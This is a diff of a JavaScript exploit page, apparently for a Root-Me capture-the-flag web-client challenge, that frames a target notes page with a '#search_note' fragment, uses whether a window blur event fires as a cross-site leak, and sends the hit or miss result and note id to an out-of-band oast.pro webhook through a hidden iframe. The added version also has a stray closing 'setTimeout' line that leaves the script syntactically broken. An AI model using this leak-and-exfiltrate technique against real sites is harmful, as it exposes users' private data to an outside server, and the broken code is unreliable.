@@ -1,27 +1,22 @@
 <script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
-let id = parseInt(new URLSearchParams(window.location.search).get('id'), 10) || 1;
-    
-function next() {
-    
+window.onload = function () {
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+    let blurFired = false;
+    window.addEventListener("blur", () => { blurFired = true; });
     const iframe = document.createElement("iframe");
     iframe.src = TARGET + id + "#search_note";
-    document.documentElement.appendChild(iframe);
-    let hit = false;
-    window.onblur = () => { hit = true; };
-    iframe.onload = () => setTimeout(done, 4000);
-    
-    function done() {
-        const exfil = document.createElement("iframe");
-        exfil.src = WEBHOOK + "?result=" + (hit ? "hit" : "miss") + "&id=" + id;
-        document.documentElement.appendChild(exfil);
-        iframe.style.display = "none";
-        exfil.style.display = "none";
-        id++;
-        setTimeout(next, 500);
-    }
-}
-    
-next();
+    document.body.appendChild(iframe);
+    setTimeout(() => {
+        const result = blurFired ? "hit" : "miss";
+        const ex = document.createElement("iframe");
+        ex.style.display = "none";
+        ex.src = WEBHOOK + "?result=" + result + "&id=" + id;
+        document.body.appendChild(ex);
+        window.removeEventListener("blur", () => { blurFired = true; });
+    }, 100);
+    }, 1000);
+};
 </script>
